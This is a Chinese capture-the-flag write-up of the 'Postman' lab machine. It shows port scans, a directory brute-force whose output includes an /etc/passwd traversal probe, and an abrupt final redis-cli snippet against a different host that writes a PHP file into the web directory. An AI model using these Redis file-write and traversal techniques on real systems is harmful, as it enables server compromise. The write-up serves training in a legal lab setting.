# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
查看开通端口
```
┌──(root💀kali)-[~/htb/Postman]
└─# nmap -p- 10.10.10.160 --open
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 22:54 EST
Nmap scan report for 10.10.10.160
Host is up (0.31s latency).
Not shown: 64665 closed ports, 866 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 107.39 seconds

```

查看端口详细信息
```
┌──(root💀kali)-[~/htb/Postman]
└─# nmap -sV -T4 -A -O 10.10.10.160 -p 22,80,6379,10000
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 22:57 EST
Nmap scan report for 10.10.10.160
Host is up (0.26s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.2.2 (Linux 3.4) (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   251.42 ms 10.10.14.1
2   253.03 ms 10.10.10.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.24 seconds

```

先把靶机域名写进host文件
> echo "10.10.10.160 Postman" >> /etc/hosts

可以看到开了ssh服务，一个80端口的http服务，6379是redis服务，10000端口是webmin服务

redis这个版本好像存在一个rce，试了几个exp都报错
> -ERR unknown command 'system.exec'

搜索了一圈，在[这个](https://serverfault.com/questions/1021564/redis-server-exploit-for-command-execution)帖子下看到一个答案
> The redis instance doesn't have MODULE command which is odd. If this is a CTF it might be intentional that the box creator removed it.

所以可能是被人为移除了这个漏洞？


## 80服务目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.160                                     

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100
Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.160/_21-12-23_22-57-15.txt

Error Log: /root/dirsearch/logs/errors-21-12-23_22-57-15.log

Target: http://10.10.10.160/

[22:57:16] Starting:            
[22:57:28] 301 -  309B  - /js  ->  http://10.10.10.160/js/                                                         
[22:58:09] 400 -  304B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[22:58:13] 301 -  310B  - /css  ->  http://10.10.10.160/css/                
[22:58:21] 301 -  312B  - /fonts  ->  http://10.10.10.160/fonts/            
[22:58:26] 301 -  313B  - /images  ->  http://10.10.10.160/images/          
[22:58:26] 200 -    2KB - /images/                                          
[22:58:27] 200 -    4KB - /index.html                                       
[22:58:28] 200 -    3KB - /js/                                                                                
[22:59:12] 301 -  313B  - /upload  ->  http://10.10.10.160/upload/          
[22:59:15] 200 -    8KB - /upload/   
```




root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/www/html/upload/
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK


